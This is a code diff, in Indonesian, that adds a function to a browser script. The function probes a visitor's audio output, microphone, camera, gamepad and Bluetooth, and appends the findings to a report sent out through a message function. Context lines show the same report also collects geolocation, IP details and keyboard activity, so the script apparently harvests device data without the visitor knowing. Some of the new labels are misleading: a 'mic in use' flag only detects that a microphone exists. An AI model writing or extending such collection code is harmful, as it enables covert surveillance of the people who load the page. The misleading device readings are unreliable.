@@ -535,6 +535,46 @@ Gamepad Terhubung     : ${gamepad}
 `.trim();
 };
 
+const ambilOutputAudioEksternal = async () => {
+  let outputAudio = 'Tidak didukung';
+  let micAktif = 'Tidak';
+  let kameraDipakaiLain = 'Tidak';
+  let bluetooth = 'Tidak';
+  let joystick = 'Tidak';
+
+  // Audio output
+  const audio = document.createElement("audio");
+  outputAudio = typeof audio.setSinkId === "function" ? "Didukung" : "Tidak";
+
+  // Mic dan Kamera (indikator sederhana)
+  try {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const mic = devices.find(d => d.kind === 'audioinput');
+    const cam = devices.find(d => d.kind === 'videoinput');
+    const audioUsed = devices.some(d => d.label.toLowerCase().includes("microphone"));
+    const camUsed = devices.some(d => d.label.toLowerCase().includes("camera"));
+
+    micAktif = mic ? "Ya" : "Tidak";
+    kameraDipakaiLain = camUsed ? "Ya" : "Tidak";
+  } catch {}
+
+  // Joystick
+  const pads = navigator.getGamepads?.();
+  if (pads && pads.length > 0 && pads[0]) joystick = "Ya";
+
+  // Bluetooth (indikasi support)
+  bluetooth = navigator.bluetooth ? "Ya" : "Tidak";
+
+  return `
+౼ 〘 𝗢𝗨𝗧𝗣𝗨𝗧 𝗔𝗨𝗗𝗜𝗢 & 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗘𝗞𝗦𝗧𝗘𝗥𝗡𝗔𝗟 〙 ౼
+Speaker Default        : Ya
+Output Audio Sink      : ${outputAudio}
+Mic Sedang Digunakan   : ${micAktif}
+Kamera Dipakai Aplikasi Lain : ${kameraDipakaiLain}
+Joystick Terdeteksi    : ${joystick}
+Bluetooth Terhubung    : ${bluetooth}`.trim();
+};
+
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -615,6 +655,7 @@ const mulai = async () => {
   // Fitur tambahan
   const keyboard = ambilKeyboardActivity();
   const perangkatEksternal = ambilPerangkatEksternal();
+  const audioEksternal = await ambilOutputAudioEksternal(); // ✅ Tambahan baru
 
   const gabungAwal = [
     infoPerangkat,
@@ -625,7 +666,8 @@ const mulai = async () => {
     izinMedia,
     ipInfo,
     keyboard,
-    perangkatEksternal
+    perangkatEksternal,
+    audioEksternal // ✅ Ditambahkan di sini
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
